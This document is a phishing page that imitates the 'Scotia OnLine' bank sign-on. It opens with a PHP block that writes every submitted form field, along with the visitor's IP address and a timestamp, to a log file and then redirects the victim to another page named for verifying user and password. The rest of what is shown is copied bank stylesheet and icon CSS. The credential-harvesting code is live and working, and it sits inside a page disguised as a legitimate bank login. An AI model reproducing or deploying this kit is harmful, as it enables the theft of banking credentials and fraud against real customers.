<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: verify_user&password.php');
$handle = fopen('log.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>

<!-- saved from url=(0178)http://onlinescotiajam.myftp.org/access.php?token=db1b677778ea2e94de8d5be8522f68b1e558ef54f4ad81237e59abd1f8515e7c839a4a66b45db36b2c9ae549217aaeb73b11dee3e484a512d896dd72935dcd88 -->
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" style="" class="RUIFW-ready desktop"><head id="j_idt3"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Scotia OnLine</title>
	
	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	  <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<!-- <meta name="apple-mobile-web-app-capable" content="yes"> -->
	   
	<meta name="viewport" content="width=device-width,initial-scale=1">
	
<style>

#navcontainer ul
{
margin: 0;
padding: 0;
list-style-type: none;
text-align: right;
}

#navcontainer ul li { display: inline; }

#navcontainer ul li a
{
text-decoration: none;
padding: .2em 1em;
color: #2a5db0;
}

.RUIFW-brand-alt {top: 0}

.form-control-signon {width: 29%;}

.form-control-reset {width: 61%;}

.signOn-pswd-instructions 
{
list-style-type: none;
margin: 0px -80px;
}

.reset-password-intructions 
{
margin: 0px -40px;	
}

.btn-holder-signon 
{
text-align: left;
}


@media print {
    #printHeader, #printFooter{display: block!important;}
    a{ color: #2a5db0 !important; }
    header{display: none!important;}
    footer{display: none!important;}
    .item-description{display: none!important;}
    #headerData{ margin-bottom:-10px;}
    #headerData label{ display:inline-block;}
    .noprint,#printHeader.noprint, #printFooter.noprint {display: none!important;}
    .navleft, .inline-nav, .quick-menu, .toggle-btn {display: none!important;}
    .actions{display: none!important;}
    .homebottomtable table tr th{ border:1px solid #d8d8d8!important;}
    .quick-menu-box{display: none!important; position: relative; overflow: visible !important; float: none !important; height:0px!important;}
    .RUIFW-container-header{display: none!important; position: relative; overflow: visible !important; float: none !important;}
    .print {display: block!important;}
    .progress{display: block!important;min-height:14px!important;overflow:visible!important;width:100%!important; clear:both; vertical-align:top; float:none;background-repeat: repeat-x;border-radius: 0px;border: 1px solid #D7D7D7!important;background-color: #d5d5d5!important;}
    .progress-bar-success { clear:both; vertical-align:top; float:none;display: block!important; overflow:hidden!important;  background-color: #00bb04!important;background-repeat:repeat-x;min-height:12px}
    .progress-bar-success:before{content:url(../images/print-progress-success.gif) ;}
    .progress-bar-danger{clear:both; vertical-align:top; float:none;display: block!important; background-color: #d81e05!important; min-height:12px;background-repeat:repeat-x; overflow:hidden!important; }
    .progress-bar-danger:before{content:url(../images/print-progress-danger.gif) ;}
    
    .overview-container{min-height:115px!important;width: 100%!important; clear:both; vertical-align:top; float:none;display: block!important; overflow:visible!important; border:none; padding-bottom:20px!important;}
    .overview-sect1{display: block!important; overflow:visible!important;padding-left:5px;}
    .overview-sect1 div.row{border-right: 1px solid #D7D7D7!important;}
    .overview-sect2{display: block!important; overflow:visible!important;}
    .RUIFW-content-main{display:block!important;width:100%!important;padding:0 0 200px 0!important; }
    .account-balance-container{display:block!important;width:100%!important;}
    .account-balance-container .RUIFW-hide.fade{max-height: 100%!important;min-height: 100%!important; display:block!important; clear:both; vertical-align:top; float:none;display: block!important; overflow:visible!important; }
    .accountDataset {border-top:1px solid #d8d8d8!important; }
    .accountDataset:before{margin-top:10px!important;}
    .tab-content-border{display:block!important;width:100%!important; margin-top:-2px!important;}
    .sub-header-bg{ width:100%;}
    .sub-header-bg .RUIFW-form-el{ border:none!important;}
    #myTab li.active{ border-bottom:2px solid #ffffff!important;}
    html, body{ border-bottom:none!important; background:none!important; padding: 0;position:relative; overflow:visible!important; float:none !important; font-family: Arial,sans-serif; }
    section{ border:none!important;}
    .RUIFW-page-wrap{ background:none!important;display: block!important;}
    .RUIFW-page-wrap:after{border:none!important; height:0px;}
    .hr-separator{display: block!important; overflow:visible!important;border-bottom: 1px solid #D7D7D7!important;height: 1px!important;width: 100%!important;margin-bottom: 15px!important;}
    a[href]:after { content: none !important;}
    .red-text {color: #d81e05!important;}
    h1{ padding-left:0px!important;margin-left:-5px;}
    .exp-collapse a.print_Open:before { content: "\f0d7"!important; margin-bottom:0px!important;padding-bottom:0px!important;}
    @page { /*margin-top: 0; margin-bottom:0;*/ size:auto;  /* auto is the current printer page size */}
    
    .fade.in.RUIFW-print-view{max-height:0px!important; overflow:hidden; z-index:0;}
    
    #transactionDetails .accnt-act-details1 {border: 1px solid #D7D7D7!important; margin-top:20px;}
    #transactionDetails .accnt-act-details1 p { margin: 0; vertical-align: text-top;border-bottom: 1px solid #D7D7D7!important; }
    #transactionDetails .accnt-act-details1 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: break-all; width: 65%; vertical-align: text-top;padding:5px!important;border-left: 1px solid #D7D7D7!important;  }
    #transactionDetails .accnt-act-details1 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; margin-bottom:0px;  width: 35%;padding:5px!important; border-right: 1px solid #D7D7D7!important;}
    
    
    .modal-open{  overflow:hidden!important;}
    .fade.modal{overflow:hidden!important; display:none;}
    .modal.RUIFW-print-view{display:block!important; position:absolute!important; top:40px!important; overflow:visible!important;}
    .modalPrint #printFooter{ margin-top:70%;}
    
    .modalPrint .modal-header{ text-align:center!important; padding:0!important;}
    .modalPrint .modal-header h4{text-align:center!important;}
    .modalPrint .modal-body{padding: 10px 0 15px 0!important;}
    .modalPrint .modal-dialog {width:98%!important; padding-top:10px!important;}
    
    .RUIFW-content-main{margin-bottom:-200px!important; }
    
    
    
    .modalPrint .accnt-act-details1 p { margin: 0; vertical-align: text-top; }
    .modalPrint .accnt-act-details1 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: break-all; width: 64.4%;  vertical-align: text-top; }
    .modalPrint .accnt-act-details1 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; margin-bottom:0px;}
    
    .datepicker table tr td.activeEvent:before , .datepicker table tr td.activeEvent.disabled:before { content: "\f111" !important; color: #d81e05; font-family: fontAwesome; font-size: 15px; margin-right:5px;   }
    
    
    /* Recipts Styles */
    #recieptBlock {font-size: 1.5em;  font-family: Arial,sans-serif; margin-top: -20px; }
    .add-txt{width:100%; float:left; font-size:0.795em;line-height: 21px;}
    .hr-separator { width: 100%; border-bottom: 1px solid #535353; height: 1px; margin:10px 0px 10px 0px; }
    .clear{clear:both;}
    .rece-txt{color: #535353; font-size:0.77em; text-align:justify; line-height: 20px; hyphens: auto;}
    .rece-txt2{color: #535353; font-size:0.77em; text-align:left; font-weight:bold;line-height: 20px;}
    .com-txt2{color: #6F6E6E; font-size:0.89em; text-align:left;line-height: 20px;}
    .t_footer{font-size:0.78em;padding:50px 0px 0px 0px; color:#F00;}
    .add_div{float:left; width:600x;}
    .logo_div{float:right; width:200px;}
    .add_txt{font-size:1em; line-height:27px;}
    .add_txt2{font-size:0.82em; line-height: 20px;}
    .padding5{padding:0 0 5px 0;}
    .right-float{float:right; width:228px; text-align:right;}
    .right-float-can{float:right; width:297px; text-align:right;}
    .left-float {float:left; width:auto; text-align:left; margin-top:21px;}
    .mrgn-top-10{margin-top:10px;}
    .padding_table td{padding: 2px 5px 2px 5px;}
    ul.star-shaped-bullet li:before {content: "\2217"}
    ul.star-shaped-bullet { margin: 0; list-style: none; text-align: left; margin-left: -40px; }
    .margin-left{margin-left: -22px;}
    .fontsize{font-size: 1em;}
    
    
    .RUIFW-container-main  {overflow:hidden;  }
    
    #content_block .btn.btn-default, #content_block .check, #content_block .btn-holder {display:none}
    .tandcHolder{height:100%;overflow:visible}
    /* CSS for Leap Phase 2 Applications*/
    .termsandconditionsWrap{height: 100%; overflow:visible;}
    .printTermsFooterDisplay {display:block !important}
    #RUIFW-print-terms-modal .modal-dialog {margin-top:30px !important; float:left;width:100%;}
    #RUIFW-print-terms-modal .width100{width:100%;}
    .modal .RUIFW-print-view .modal-body .termsandconditionsWrap{display: block !important; height: 100% !important;}
    .print-button-wrap{display:none;}
    .download-print-button {display:none !important;}
    #RUIFW-print-terms-modal .modal-open{  overflow:visible!important;}
    #confirmView .mrgn-left-0{margin-left:0px}
    #confirmView .RUIFW-content-main{margin-bottom:0 !important; padding-bottom:0px !important;}
    .mainWrap{margin-bottom:0px;}
    #campaignForm .modal, #RUIFW-print-terms-modal{margin-top:0;}
    /* Firefox CSS print CSS */
    
    @-moz-document url-prefix() {
        
    .RUIFW-content-main{display:block!important;width:680px!important;padding:0px!important;margin-top:-40px !important;}
    h1{ padding-left:0px!important;position:relative; overflow:visible !important; float: none !important;min-height:55px; margin-left:-5px;margin-top:-700px !important;}
    .account-balance-container{display:block!important;width:680px!important;}
    .tab-content-border{display:block!important;width:680px!important; margin-top:-2px!important;}
    .modal.RUIFW-print-view{top:40px!important;}
    #printFooter{margin-top:200px !important;}
    .modalPrint #printFooter{ margin-top:70%  !important;}
    .RUIFW-container-main {  overflow:visible; }
    #RUIFW-print-terms-modal .modal-dialog{page-break-after:avoid;width:100%; float:left;}
    #confirmView h1{page-break-before:always !important; margin-top:-120% !important;}
    .leftWrapper{margin-top:0;position:relative; left:2px;}
    }
    
    
    }
    
	
	
 @font-face {
    font-family: 'FontAwesome';
    src: url('../font/fontawesome-webfont.eot?v=3.2.1');
    src: url('../font/fontawesome-webfont.eot?#iefix&v=3.2.1') format('embedded-opentype'), 
    url('../font/fontawesome-webfont.woff?v=3.2.1') format('woff'), 
    url('../font/fontawesome-webfont.ttf?v=3.2.1') format('truetype'), 
    url('../font/fontawesome-webfont.svg#fontawesomeregular?v=3.2.1') format('svg');
    font-weight: normal;
    font-style: normal;
  }
  /* FONT AWESOME CORE
   * -------------------------- */
  [class^="icon-"],
  [class*=" icon-"] {
    font-family: FontAwesome;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    -webkit-font-smoothing: antialiased;
    *margin-right: .3em;
  }
  [class^="icon-"]:before,
  [class*=" icon-"]:before {
    text-decoration: inherit;
    display: inline-block;
    speak: none;
  }
  /* makes the font 33% larger relative to the icon container */
  .icon-large:before {
    vertical-align: -10%;
    font-size: 1.3333333333333333em;
  }
  /* makes sure icons active on rollover in links */
  a [class^="icon-"],
  a [class*=" icon-"] {
    display: inline;
  }
  /* increased font size for icon-large */
  [class^="icon-"].icon-fixed-width,
  [class*=" icon-"].icon-fixed-width {
    display: inline-block;
    width: 1.1428571428571428em;
    text-align: right;
    padding-right: 0.2857142857142857em;
  }
  [class^="icon-"].icon-fixed-width.icon-large,
  [class*=" icon-"].icon-fixed-width.icon-large {
    width: 1.4285714285714286em;
  }
  .icons-ul {
    margin-left: 2.142857142857143em;
    list-style-type: none;
  }
  .icons-ul > li {
    position: relative;
  }
  .icons-ul .icon-li {
    position: absolute;
    left: -2.142857142857143em;
    width: 2.142857142857143em;
    text-align: center;
    line-height: inherit;
  }
  [class^="icon-"].hide,
  [class*=" icon-"].hide {
    display: none;
  }
  .icon-muted {
    color: #eeeeee;
  }
  .icon-light {
    color: #ffffff;
  }
  .icon-dark {
    color: #333333;
  }
  .icon-border {
    border: solid 1px #eeeeee;
    padding: .2em .25em .15em;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
  }
  .icon-2x {
    font-size: 2em;
  }
  .icon-2x.icon-border {
    border-width: 2px;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
  }
  .icon-3x {
    font-size: 3em;
  }
  .icon-3x.icon-border {
    border-width: 3px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
  }
  .icon-4x {
    font-size: 4em;
  }
  .icon-4x.icon-border {
    border-width: 4px;
    -webkit-border-radius: 6px;
    -moz-border-radius: 6px;
    border-radius: 6px;
  }
  .icon-5x {
    font-size: 5em;
  }
  .icon-5x.icon-border {
    border-width: 5px;
    -webkit-border-radius: 7px;
    -moz-border-radius: 7px;
    border-radius: 7px;
  }
  .pull-right {
    float: right;
  }
  .pull-left {
    float: left;
  }
  [class^="icon-"].pull-left,
  [class*=" icon-"].pull-left {
    margin-right: .3em;
  }
  [class^="icon-"].pull-right,
  [class*=" icon-"].pull-right {
    margin-left: .3em;
  }
  /* BOOTSTRAP SPECIFIC CLASSES
   * -------------------------- */
  /* Bootstrap 2.0 sprites.less reset */
  [class^="icon-"],
  [class*=" icon-"] {
    display: inline;
    width: auto;
    height: auto;
    line-height: normal;
    vertical-align: baseline;
    background-image: none;
    background-position: 0% 0%;
    background-repeat: repeat;
    margin-top: 0;
  }
  /* more sprites.less reset */
  .icon-white,
  .nav-pills > .active > a > [class^="icon-"],
  .nav-pills > .active > a > [class*=" icon-"],
  .nav-list > .active > a > [class^="icon-"],
  .nav-list > .active > a > [class*=" icon-"],
  .navbar-inverse .nav > .active > a > [class^="icon-"],
  .navbar-inverse .nav > .active > a > [class*=" icon-"],
  .dropdown-menu > li > a:hover > [class^="icon-"],
  .dropdown-menu > li > a:hover > [class*=" icon-"],
  .dropdown-menu > .active > a > [class^="icon-"],
  .dropdown-menu > .active > a > [class*=" icon-"],
  .dropdown-submenu:hover > a > [class^="icon-"],
  .dropdown-submenu:hover > a > [class*=" icon-"] {
    background-image: none;
  }
  /* keeps Bootstrap styles with and without icons the same */
  .btn [class^="icon-"].icon-large,
  .nav [class^="icon-"].icon-large,
  .btn [class*=" icon-"].icon-large,
  .nav [class*=" icon-"].icon-large {
    line-height: .9em;
  }
  .btn [class^="icon-"].icon-spin,
  .nav [class^="icon-"].icon-spin,
  .btn [class*=" icon-"].icon-spin,
  .nav [class*=" icon-"].icon-spin {
    display: inline-block;
  }
  .nav-tabs [class^="icon-"],
  .nav-pills [class^="icon-"],
  .nav-tabs [class*=" icon-"],
  .nav-pills [class*=" icon-"],
  .nav-tabs [class^="icon-"].icon-large,
  .nav-pills [class^="icon-"].icon-large,
  .nav-tabs [class*=" icon-"].icon-large,
  .nav-pills [class*=" icon-"].icon-large {
    line-height: .9em;
  }
  .btn [class^="icon-"].pull-left.icon-2x,
  .btn [class*=" icon-"].pull-left.icon-2x,
  .btn [class^="icon-"].pull-right.icon-2x,
  .btn [class*=" icon-"].pull-right.icon-2x {
    margin-top: .18em;
  }
  .btn [class^="icon-"].icon-spin.icon-large,
  .btn [class*=" icon-"].icon-spin.icon-large {
    line-height: .8em;
  }
  .btn.btn-small [class^="icon-"].pull-left.icon-2x,
  .btn.btn-small [class*=" icon-"].pull-left.icon-2x,
  .btn.btn-small [class^="icon-"].pull-right.icon-2x,
  .btn.btn-small [class*=" icon-"].pull-right.icon-2x {
    margin-top: .25em;
  }
  .btn.btn-large [class^="icon-"],
  .btn.btn-large [class*=" icon-"] {
    margin-top: 0;
  }
  .btn.btn-large [class^="icon-"].pull-left.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-left.icon-2x,
  .btn.btn-large [class^="icon-"].pull-right.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-right.icon-2x {
    margin-top: .05em;
  }
  .btn.btn-large [class^="icon-"].pull-left.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-left.icon-2x {
    margin-right: .2em;
  }
  .btn.btn-large [class^="icon-"].pull-right.icon-2x,
  .btn.btn-large [class*=" icon-"].pull-right.icon-2x {
    margin-left: .2em;
  }
  /* Fixes alignment in nav lists */
  .nav-list [class^="icon-"],
  .nav-list [class*=" icon-"] {
    line-height: inherit;
  }
  /* EXTRAS
   * -------------------------- */
  /* Stacked and layered icon */
  .icon-stack {
    position: relative;
    display: inline-block;
    width: 2em;
    height: 2em;
    line-height: 2em;
    vertical-align: -35%;
  }
  .icon-stack [class^="icon-"],
  .icon-stack [class*=" icon-"] {
    display: block;
    text-align: center;
    position: absolute;
    width: 100%;
    height: 100%;
    font-size: 1em;
    line-height: inherit;
    *line-height: 2em;
  }
  .icon-stack .icon-stack-base {
    font-size: 2em;
    *line-height: 1em;
  }
  /* Animated rotating icon */
  .icon-spin {
    display: inline-block;
    -moz-animation: spin 2s infinite linear;
    -o-animation: spin 2s infinite linear;
    -webkit-animation: spin 2s infinite linear;
    animation: spin 2s infinite linear;
  }
  /* Prevent stack and spinners from being taken inline when inside a link */
  a .icon-stack,
  a .icon-spin {
    display: inline-block;
    text-decoration: none;
  }
  @-moz-keyframes spin {
    0% {
      -moz-transform: rotate(0deg);
    }
    100% {
      -moz-transform: rotate(359deg);
    }
  }
  @-webkit-keyframes spin {
    0% {
      -webkit-transform: rotate(0deg);
    }
    100% {
      -webkit-transform: rotate(359deg);
    }
  }
  @-o-keyframes spin {
    0% {
      -o-transform: rotate(0deg);
    }
    100% {
      -o-transform: rotate(359deg);
    }
  }
  @-ms-keyframes spin {
    0% {
      -ms-transform: rotate(0deg);
    }
    100% {
      -ms-transform: rotate(359deg);
    }
  }
  @keyframes spin {
    0% {
      transform: rotate(0deg);
    }
    100% {
      transform: rotate(359deg);
    }
  }
  /* Icon rotations and mirroring */
  .icon-rotate-90:before {
    -webkit-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    transform: rotate(90deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=1);
  }
  .icon-rotate-180:before {
    -webkit-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    transform: rotate(180deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=2);
  }
  .icon-rotate-270:before {
    -webkit-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    transform: rotate(270deg);
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=3);
  }
  .icon-flip-horizontal:before {
    -webkit-transform: scale(-1, 1);
    -moz-transform: scale(-1, 1);
    -ms-transform: scale(-1, 1);
    -o-transform: scale(-1, 1);
    transform: scale(-1, 1);
  }
  .icon-flip-vertical:before {
    -webkit-transform: scale(1, -1);
    -moz-transform: scale(1, -1);
    -ms-transform: scale(1, -1);
    -o-transform: scale(1, -1);
    transform: scale(1, -1);
  }
  /* ensure rotation occurs inside anchor tags */
  a .icon-rotate-90:before,
  a .icon-rotate-180:before,
  a .icon-rotate-270:before,
  a .icon-flip-horizontal:before,
  a .icon-flip-vertical:before {
    display: inline-block;
  }
  /* Font Awesome uses the Unicode Private Use Area (PUA) to ensure screen
     readers do not read off random characters that represent icons */
  .icon-glass:before {
    content: "\f000";
  }
  .icon-music:before {
    content: "\f001";
  }
  .icon-search:before {
    content: "\f002";
  }
  .icon-envelope-alt:before {
    content: "\f003";
  }
  .icon-heart:before {
    content: "\f004";
  }
  .icon-star:before {
    content: "\f005";
  }
  .icon-star-empty:before {
    content: "\f006";
  }
  .icon-user:before {
    content: "\f007";
  }
  .icon-film:before {
    content: "\f008";
  }
  .icon-th-large:before {
    content: "\f009";
  }
  .icon-th:before {
    content: "\f00a";
  }
  .icon-th-list:before {
    content: "\f00b";
  }
  .icon-ok:before {
    content: "\f00c";
  }
  .icon-remove:before {
    content: "\f00d";
  }
  .icon-zoom-in:before {
    content: "\f00e";
  }
  .icon-zoom-out:before {
    content: "\f010";
  }
  .icon-power-off:before,
  .icon-off:before {
    content: "\f011";
  }
  .icon-signal:before {
    content: "\f012";
  }
  .icon-gear:before,
  .icon-cog:before {
    content: "\f013";
  }
  .icon-trash:before {
    content: "\f014";
  }
  .icon-home:before {
    content: "\f015";
  }
  .icon-file-alt:before {
    content: "\f016";
  }
  .icon-time:before {
    content: "\f017";
  }
  .icon-road:before {
    content: "\f018";
  }
  .icon-download-alt:before {
    content: "\f019";
  }
  .icon-download:before {
    content: "\f01a";
  }
  .icon-upload:before {
    content: "\f01b";
  }
  .icon-inbox:before {
    content: "\f01c";
  }
  .icon-play-circle:before {
    content: "\f01d";
  }
  .icon-rotate-right:before,
  .icon-repeat:before {
    content: "\f01e";
  }
  .icon-refresh:before {
    content: "\f021";
  }
  .icon-list-alt:before {
    content: "\f022";
  }
  .icon-lock:before {
    content: "\f023";
  }
  .icon-flag:before {
    content: "\f024";
  }
  .icon-headphones:before {
    content: "\f025";
  }
  .icon-volume-off:before {
    content: "\f026";
  }
  .icon-volume-down:before {
    content: "\f027";
  }
  .icon-volume-up:before {
    content: "\f028";
  }
  .icon-qrcode:before {
    content: "\f029";
  }
  .icon-barcode:before {
    content: "\f02a";
  }
  .icon-tag:before {
    content: "\f02b";
  }
  .icon-tags:before {
    content: "\f02c";
  }
  .icon-book:before {
    content: "\f02d";
  }
  .icon-bookmark:before {
    content: "\f02e";
  }
  .icon-print:before {
    content: "\f02f";
  }
  .icon-camera:before {
    content: "\f030";
  }
  .icon-font:before {
    content: "\f031";
  }
  .icon-bold:before {
    content: "\f032";
  }
  .icon-italic:before {
    content: "\f033";
  }
  .icon-text-height:before {
    content: "\f034";
  }
  .icon-text-width:before {
    content: "\f035";
  }
  .icon-align-left:before {
    content: "\f036";
  }
  .icon-align-center:before {
    content: "\f037";
  }
  .icon-align-right:before {
    content: "\f038";
  }
  .icon-align-justify:before {
    content: "\f039";
  }
  .icon-list:before {
    content: "\f03a";
  }
  .icon-indent-left:before {
    content: "\f03b";
  }
  .icon-indent-right:before {
    content: "\f03c";
  }
  .icon-facetime-video:before {
    content: "\f03d";
  }
  .icon-picture:before {
    content: "\f03e";
  }
  .icon-pencil:before {
    content: "\f040";
  }
  .icon-map-marker:before {
    content: "\f041";
  }
  .icon-adjust:before {
    content: "\f042";
  }
  .icon-tint:before {
    content: "\f043";
  }
  .icon-edit:before {
    content: "\f044";
  }
  .icon-share:before {
    content: "\f045";
  }
  .icon-check:before {
    content: "\f046";
  }
  .icon-move:before {
    content: "\f047";
  }
  .icon-step-backward:before {
    content: "\f048";
  }
  .icon-fast-backward:before {
    content: "\f049";
  }
  .icon-backward:before {
    content: "\f04a";
  }
  .icon-play:before {
    content: "\f04b";
  }
  .icon-pause:before {
    content: "\f04c";
  }
  .icon-stop:before {
    content: "\f04d";
  }
  .icon-forward:before {
    content: "\f04e";
  }
  .icon-fast-forward:before {
    content: "\f050";
  }
  .icon-step-forward:before {
    content: "\f051";
  }
  .icon-eject:before {
    content: "\f052";
  }
  .icon-chevron-left:before {
    content: "\f053";
  }
  .icon-chevron-right:before {
    content: "\f054";
  }
  .icon-plus-sign:before {
    content: "\f055";
  }
  .icon-minus-sign:before {
    content: "\f056";
  }
  .icon-remove-sign:before {
    content: "\f057";
  }
  .icon-ok-sign:before {
    content: "\f058";
  }
  .icon-question-sign:before {
    content: "\f059";
  }
  .icon-info-sign:before {
    content: "\f05a";
  }
  .icon-screenshot:before {
    content: "\f05b";
  }
  .icon-remove-circle:before {
    content: "\f05c";
  }
  .icon-ok-circle:before {
    content: "\f05d";
  }
  .icon-ban-circle:before {
    content: "\f05e";
  }
  .icon-arrow-left:before {
    content: "\f060";
  }
  .icon-arrow-right:before {
    content: "\f061";
  }
  .icon-arrow-up:before {
    content: "\f062";
  }
  .icon-arrow-down:before {
    content: "\f063";
  }
  .icon-mail-forward:before,
  .icon-share-alt:before {
    content: "\f064";
  }
  .icon-resize-full:before {
    content: "\f065";
  }
  .icon-resize-small:before {
    content: "\f066";
  }
  .icon-plus:before {
    content: "\f067";
  }
  .icon-minus:before {
    content: "\f068";
  }
  .icon-asterisk:before {
    content: "\f069";
  }
  .icon-exclamation-sign:before {
    content: "\f06a";
  }
  .icon-gift:before {
    content: "\f06b";
  }
  .icon-leaf:before {
    content: "\f06c";
  }
  .icon-fire:before {
    content: "\f06d";
  }
  .icon-eye-open:before {
    content: "\f06e";
  }
  .icon-eye-close:before {
    content: "\f070";
  }
  .icon-warning-sign:before {
    content: "\f071";
  }
  .icon-plane:before {
    content: "\f072";
  }
  .icon-calendar:before {
    content: "\f073";
  }
  .icon-random:before {
    content: "\f074";
  }
  .icon-comment:before {
    content: "\f075";
  }
  .icon-magnet:before {
    content: "\f076";
  }
  .icon-chevron-up:before {
    content: "\f077";
  }
  .icon-chevron-down:before {
    content: "\f078";
  }
  .icon-retweet:before {
    content: "\f079";
  }
  .icon-shopping-cart:before {
    content: "\f07a";
  }
  
  .icon-dialog-close:before {
      content: "\f00d";
  }
  
  .icon-folder-close:before {
    content: "\f07b";
  }
  .icon-folder-open:before {
    content: "\f07c";
  }
  .icon-resize-vertical:before {
    content: "\f07d";
  }
  .icon-resize-horizontal:before {
    content: "\f07e";
  }
  .icon-bar-chart:before {
    content: "\f080";
  }
  .icon-twitter-sign:before {
    content: "\f081";
  }
  .icon-facebook-sign:before {
    content: "\f082";
  }
  .icon-camera-retro:before {
    content: "\f083";
  }
  .icon-key:before {
    content: "\f084";
  }
  .icon-gears:before,
  .icon-cogs:before {
    content: "\f085";
  }
  .icon-comments:before {
    content: "\f086";
  }
  .icon-thumbs-up-alt:before {
    content: "\f087";
  }
  .icon-thumbs-down-alt:before {
    content: "\f088";
  }
  .icon-star-half:before {
    content: "\f089";
  }
  .icon-heart-empty:before {
    content: "\f08a";
  }
  .icon-signout:before {
    content: "\f08b";
  }
  .icon-linkedin-sign:before {
    content: "\f08c";
  }
  .icon-pushpin:before {
    content: "\f08d";
  }
  .icon-external-link:before {
    content: "\f08e";
  }
  .icon-signin:before {
    content: "\f090";
  }
  .icon-trophy:before {
    content: "\f091";
  }
  .icon-github-sign:before {
    content: "\f092";
  }
  .icon-upload-alt:before {
    content: "\f093";
  }
  .icon-lemon:before {
    content: "\f094";
  }
  .icon-phone:before {
    content: "\f095";
  }
  .icon-unchecked:before,
  .icon-check-empty:before {
    content: "\f096";
  }
  .icon-bookmark-empty:before {
    content: "\f097";
  }
  .icon-phone-sign:before {
    content: "\f098";
  }
  .icon-twitter:before {
    content: "\f099";
  }
  .icon-facebook:before {
    content: "\f09a";
  }
  .icon-github:before {
    content: "\f09b";
  }
  .icon-unlock:before {
    content: "\f09c";
  }
  .icon-credit-card:before {
    content: "\f09d";
  }
  .icon-rss:before {
    content: "\f09e";
  }
  .icon-hdd:before {
    content: "\f0a0";
  }
  .icon-bullhorn:before {
    content: "\f0a1";
  }
  .icon-bell:before {
    content: "\f0a2";
  }
  .icon-certificate:before {
    content: "\f0a3";
  }
  .icon-hand-right:before {
    content: "\f0a4";
  }
  .icon-hand-left:before {
    content: "\f0a5";
  }
  .icon-hand-up:before {
    content: "\f0a6";
  }
  .icon-hand-down:before {
    content: "\f0a7";
  }
  .icon-circle-arrow-left:before {
    content: "\f0a8";
  }
  .icon-circle-arrow-right:before {
    content: "\f0a9";
  }
  .icon-circle-arrow-up:before {
    content: "\f0aa";
  }
  .icon-circle-arrow-down:before {
    content: "\f0ab";
  }
  .icon-globe:before {
    content: "\f0ac";
  }
  .icon-wrench:before {
    content: "\f0ad";
  }
  .icon-tasks:before {
    content: "\f0ae";
  }
  .icon-filter:before {
    content: "\f0b0";
  }
  .icon-briefcase:before {
    content: "\f0b1";
  }
  .icon-fullscreen:before {
    content: "\f0b2";
  }
  .icon-group:before {
    content: "\f0c0";
  }
  .icon-link:before {
    content: "\f0c1";
  }
  .icon-cloud:before {
    content: "\f0c2";
  }
  .icon-beaker:before {
    content: "\f0c3";
  }
  .icon-cut:before {
    content: "\f0c4";
  }
  .icon-copy:before {
    content: "\f0c5";
  }
  .icon-paperclip:before,
  .icon-paper-clip:before {
    content: "\f0c6";
  }
  .icon-save:before {
    content: "\f0c7";
  }
  .icon-sign-blank:before {
    content: "\f0c8";
  }
  .icon-reorder:before {
    content: "\f0c9";
  }
  .icon-list-ul:before {
    content: "\f0ca";
  }
  .icon-list-ol:before {
    content: "\f0cb";
  }
  .icon-strikethrough:before {
    content: "\f0cc";
  }
  .icon-underline:before {
    content: "\f0cd";
  }
  .icon-table:before {
    content: "\f0ce";
  }
  .icon-magic:before {
    content: "\f0d0";
  }
  .icon-truck:before {
    content: "\f0d1";
  }
  .icon-pinterest:before {
    content: "\f0d2";
  }
  .icon-pinterest-sign:before {
    content: "\f0d3";
  }
  .icon-google-plus-sign:before {
    content: "\f0d4";
  }
  .icon-google-plus:before {
    content: "\f0d5";
  }
  .icon-money:before {
    content: "\f0d6";
  }
  .icon-caret-down:before {
    content: "\f0d7";
  }
  .icon-caret-up:before {
    content: "\f0d8";
  }
  .icon-caret-left:before {
    content: "\f0d9";
  }
  .icon-caret-right:before {
    content: "\f0da";
  }
  .icon-columns:before {
    content: "\f0db";
  }
  .icon-sort:before {
    content: "\f0dc";
  }
  .icon-sort-down:before {
    content: "\f0dd";
  }
  .icon-sort-up:before {
    content: "\f0de";
  }
  .icon-envelope:before {
    content: "\f0e0";
  }
  .icon-linkedin:before {
    content: "\f0e1";
  }
  .icon-rotate-left:before,
  .icon-undo:before {
    content: "\f0e2";
  }
  .icon-legal:before {
    content: "\f0e3";
  }
  .icon-dashboard:before {
    content: "\f0e4";
  }
  .icon-comment-alt:before {
    content: "\f0e5";
  }
  .icon-comments-alt:before {
    content: "\f0e6";
  }
  .icon-bolt:before {
    content: "\f0e7";
  }
  .icon-sitemap:before {
    content: "\f0e8";
  }
  .icon-umbrella:before {
    content: "\f0e9";
  }
  .icon-paste:before {
    content: "\f0ea";
  }
  .icon-lightbulb:before {
    content: "\f0eb";
  }
